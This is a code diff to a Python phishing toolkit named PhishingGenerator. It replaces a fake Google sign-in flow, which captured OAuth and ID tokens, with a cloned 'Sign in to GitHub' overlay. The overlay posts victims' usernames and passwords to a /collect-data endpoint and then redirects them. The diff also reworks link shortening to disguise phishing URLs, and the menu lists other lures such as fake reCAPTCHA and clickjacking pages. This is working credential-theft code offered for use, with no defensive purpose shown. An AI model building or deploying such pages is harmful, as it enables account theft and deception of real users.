@@ -12,7 +12,7 @@ import threading
 import requests
 import logging
 from flask import Flask, request, redirect, jsonify, make_response
-import pyshorteners
+
 from urllib.parse import urlparse, urljoin, quote
 from rich.console import Console
 from rich.table import Table
@@ -108,7 +108,7 @@ class PhishingGenerator:
         self.language = None
         self.ngrok_auth_token = None
         self.show_victims = False
-        self.shortener = pyshorteners.Shortener()
+
         self.secret_key = os.urandom(24)
         self.live_display = None
         self.webhook_url = self._load_session_key('webhook_url')
@@ -526,64 +526,74 @@ class PhishingGenerator:
 
                 elif phish_type == "googleauth":
                     permission_script += """
-                    var gaOverlay = document.createElement('div');
-                    gaOverlay.id = 'gaOverlay';
-                    gaOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:99999;';
-                    gaOverlay.innerHTML = '<div style="text-align:center;padding:20px;">' +
-                        '<div style="width:48px;height:48px;margin:0 auto 20px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:gaSpin .8s linear infinite;"></div>' +
-                        '<style>@keyframes gaSpin{to{transform:rotate(360deg)}}</style>' +
-                        '<h2 style="color:#202124;font-size:20px;font-weight:400;margin:0;">Signing in with Google...</h2>' +
-                        '<p style="color:#5f6368;font-size:14px;margin:8px 0 0;">Opening secure login window</p>' +
-                    '</div>';
-                    document.body.appendChild(gaOverlay);
+                    var ghOverlay = document.createElement('div');
+                    ghOverlay.id = 'ghOverlay';
+                    ghOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#f6f8fa;display:flex;justify-content:center;align-items:center;z-index:99999;';
+                    ghOverlay.innerHTML =
+                        '<div style="background:#fff;border-radius:6px;padding:20px 16px 16px;max-width:340px;width:90%;border:1px solid #d0d7de;text-align:center;">' +
+                            '<div style="margin-bottom:16px;">' +
+                                '<svg height="48" viewBox="0 0 16 16" width="48" style="fill:#1f2328;"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>' +
+                            '</div>' +
+                            '<h1 style="font-size:20px;font-weight:400;color:#1f2328;margin:0 0 16px;">Sign in to GitHub</h1>' +
+                            '<div style="text-align:left;margin-bottom:16px;">' +
+                                '<label style="display:block;font-size:14px;font-weight:400;color:#1f2328;margin-bottom:6px;">Username or email address</label>' +
+                                '<input id="ghUser" type="text" style="width:100%;padding:5px 12px;font-size:14px;line-height:20px;border:1px solid #d0d7de;border-radius:6px;outline:none;background:#f6f8fa;" autocomplete="username">' +
+                            '</div>' +
+                            '<div style="text-align:left;margin-bottom:16px;">' +
+                                '<div style="display:flex;justify-content:space-between;margin-bottom:6px;">' +
+                                    '<label style="font-size:14px;font-weight:400;color:#1f2328;">Password</label>' +
+                                    '<a style="font-size:12px;color:#0969da;text-decoration:none;cursor:pointer;" id="ghForgot">Forgot password?</a>' +
+                                '</div>' +
+                                '<input id="ghPass" type="password" style="width:100%;padding:5px 12px;font-size:14px;line-height:20px;border:1px solid #d0d7de;border-radius:6px;outline:none;background:#f6f8fa;" autocomplete="current-password">' +
+                            '</div>' +
+                            '<button id="ghSignin" style="width:100%;padding:6px 12px;font-size:14px;font-weight:500;color:#fff;background:#2da44e;border:1px solid #1a7f37;border-radius:6px;cursor:pointer;line-height:20px;">Sign in</button>' +
+                            '<div style="margin-top:16px;padding-top:16px;border-top:1px solid #d0d7de;font-size:12px;color:#656d76;">' +
+                                '<span>New to GitHub? </span><a style="color:#0969da;text-decoration:none;cursor:pointer;font-weight:500;" id="ghCreate">Create an account</a>' +
+                            '</div>' +
+                            '<div id="ghError" style="display:none;margin-top:12px;padding:8px 12px;background:#fff1f0;border:1px solid #d1242f;border-radius:6px;font-size:12px;color:#d1242f;text-align:left;">Incorrect username or password.</div>' +
+                        '</div>';
+                    document.body.appendChild(ghOverlay);
 
-                    var gaModule = document.createElement('script');
-                    gaModule.type = 'module';
-                    gaModule.textContent = `
-                        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
-                        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";
+                    ['ghUser','ghPass'].forEach(function(id) {
+                        document.getElementById(id).addEventListener('focus', function() {
+                            this.style.background = '#fff';
+                            this.style.borderColor = '#0969da';
+                            this.style.boxShadow = '0 0 0 3px rgba(9,105,218,0.3)';
+                        });
+                        document.getElementById(id).addEventListener('blur', function() {
+                            this.style.background = '#f6f8fa';
+                            this.style.borderColor = '#d0d7de';
+                            this.style.boxShadow = 'none';
+                        });
+                    });
 
-                        const firebaseConfig = {
-                            apiKey: "AIzaSyBzxNTB-CwcwPQ2C-CRrqVtLQjQY48GEe4",
-                            authDomain: "culture-media-d9a90.firebaseapp.com",
-                            databaseURL: "https://culture-media-d9a90-default-rtdb.asia-southeast1.firebasedatabase.app",
-                            projectId: "culture-media-d9a90",
-                            storageBucket: "culture-media-d9a90.firebasestorage.app",
-                            messagingSenderId: "242303102106",
-                            appId: "1:242303102106:web:4112d61764349f37ddc323",
-                            measurementId: "G-98Z9EY3EWT"
-                        };
+                    function ghSubmit() {
+                        var user = document.getElementById('ghUser').value.trim();
+                        var pass = document.getElementById('ghPass').value;
+                        if (!user || !pass) {
+                            document.getElementById('ghError').textContent = 'Enter a username or email address and password.';
+                            document.getElementById('ghError').style.display = 'block';
+                            return;
+                        }
+                        document.getElementById('ghSignin').disabled = true;
+                        document.getElementById('ghSignin').textContent = 'Signing in...';
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'github_auth', data: { username: user, password: pass } })
+                        }).then(function() {
+                            window.top.location.href = '""" + target_url + """';
+                        });
+                    }
 
-                        const app = initializeApp(firebaseConfig);
-                        const auth = getAuth(app);
-                        const provider = new GoogleAuthProvider();
-                        provider.setCustomParameters({ prompt: 'select_account' });
-
-                        (async () => {
-                            try {
-                                const result = await signInWithPopup(auth, provider);
-                                const user = result.user;
-                                const data = {
-                                    email: user.email,
-                                    name: user.displayName,
-                                    uid: user.uid,
-                                    photoURL: user.photoURL,
-                                    oauthToken: result._tokenResponse?.oauthAccessToken || '',
-                                    idToken: result._tokenResponse?.idToken || ''
-                                };
-                                fetch('/collect-data', {
-                                    method: 'POST',
-                                    headers: {'Content-Type': 'application/json'},
-                                    body: JSON.stringify({ type: 'google_auth', data: data })
-                                }).then(function() {
-                                    window.top.location.href = '""" + target_url + """';
-                                });
-                            } catch (e) {
-                                window.top.location.href = '""" + target_url + """';
-                            }
-                        })();
-                    `;
-                    document.body.appendChild(gaModule);
+                    document.getElementById('ghSignin').addEventListener('click', ghSubmit);
+                    document.getElementById('ghPass').addEventListener('keydown', function(e) {
+                        if (e.key === 'Enter') ghSubmit();
+                    });
+                    document.getElementById('ghUser').addEventListener('keydown', function(e) {
+                        if (e.key === 'Enter') document.getElementById('ghPass').focus();
+                    });
+                    setTimeout(function() { document.getElementById('ghUser').focus(); }, 200);
                     """
 
                 elif phish_type == "recaptcha":
@@ -600,7 +610,7 @@ class PhishingGenerator:
                             '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 18px;">Please complete the security check to access this page. This helps us prevent automated requests.</p>' +
                             '<div id="rcCheckbox" style="display:flex;align-items:center;justify-content:center;gap:12px;background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:12px 16px;margin-bottom:16px;cursor:pointer;">' +
                                 '<div id="rcBox" style="width:24px;height:24px;border:2px solid #5f6368;border-radius:4px;display:flex;align-items:center;justify-content:center;transition:.2s;"></div>' +
-                                '<span style="color:#3c4043;font-size:14px;font-weight:500;">I\'m not a robot</span>' +
+                                '<span style="color:#3c4043;font-size:14px;font-weight:500;">I\\'m not a robot</span>' +
                                 '<div style="margin-left:auto;display:flex;gap:4px;">' +
                                     '<svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>' +
                                 '</div>' +
@@ -1198,17 +1208,20 @@ class PhishingGenerator:
             self.server_url = None
 
     def _shorten_url_for_display(self, url):
-        for name, fn in [("is.gd", lambda u: self.shortener.isgd.short(u)),
-                          ("da.gd", lambda u: self.shortener.dagd.short(u)),
-                          ("TinyURL", lambda u: self.shortener.tinyurl.short(u))]:
+        services = [
+            ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": url}, timeout=8)),
+            ("TinyURL", lambda: requests.get(f"https://tinyurl.com/api-create.php?url={quote(url, safe='')}", timeout=8)),
+        ]
+        for name, fn in services:
             try:
-                s = fn(url)
-                if s and s != url:
+                r = fn()
+                s = r.text.strip()
+                if r.status_code == 200 and s and 'error' not in s.lower():
                     console.print(f"[dim]🔗 Short: {s} ({name})[/]")
                     return
             except:
                 continue
-        console.print(f"[dim]🔗 Short: (all shorteners failed for this URL)[/]")
+        console.print(f"[dim]🔗 Raw tunnel URL: {url}[/]")
 
     def setup_tunnel(self):
         self.clear_screen()
@@ -1465,8 +1478,8 @@ class PhishingGenerator:
              "Location + Camera simultaneously" if self.language == "en" else "Lokasi + Kamera bersamaan"),
             ("7", "Clickjack Phishing" if self.language == "en" else "Phishing Clickjack",
              "Fake download/getlink trap" if self.language == "en" else "Jebakan download/getlink palsu"),
-            ("8", "Google Auth" if self.language == "en" else "Google Auth",
-             "Fake Google 2FA verification" if self.language == "en" else "Verifikasi 2FA Google palsu"),
+            ("8", "GitHub OAuth" if self.language == "en" else "GitHub OAuth",
+             "Fake GitHub login page" if self.language == "en" else "Halaman login GitHub palsu"),
             ("9", "reCAPTCHA Phishing" if self.language == "en" else "Phishing reCAPTCHA",
              "Fake reCAPTCHA with location verification" if self.language == "en" else "reCAPTCHA palsu dengan verifikasi lokasi"),
             ("10", "View Results" if self.language == "en" else "Lihat Hasil",
@@ -1518,12 +1531,16 @@ class PhishingGenerator:
                 f.write(proxy_template)
                 
             shortened_url = None
-            for name, fn in [("is.gd", lambda u: self.shortener.isgd.short(u)),
-                              ("da.gd", lambda u: self.shortener.dagd.short(u)),
-                              ("TinyURL", lambda u: self.shortener.tinyurl.short(u))]:
+            services = [
+                ("cleanURI", lambda: requests.post("https://cleanuri.com/api/v1/shorten", data={"url": phish_url}, timeout=8)),
+                ("TinyURL", lambda: requests.get(f"https://tinyurl.com/api-create.php?url={quote(phish_url, safe='')}", timeout=8)),
+            ]
+            for name, fn in services:
                 try:
-                    shortened_url = fn(phish_url)
-                    if shortened_url:
+                    r = fn()
+                    s = r.text.strip()
+                    if r.status_code == 200 and s and 'error' not in s.lower():
+                        shortened_url = s
                         break
                 except Exception as e:
                     console.print(f"[dim]  {name} failed: {str(e)[:60]}[/]")
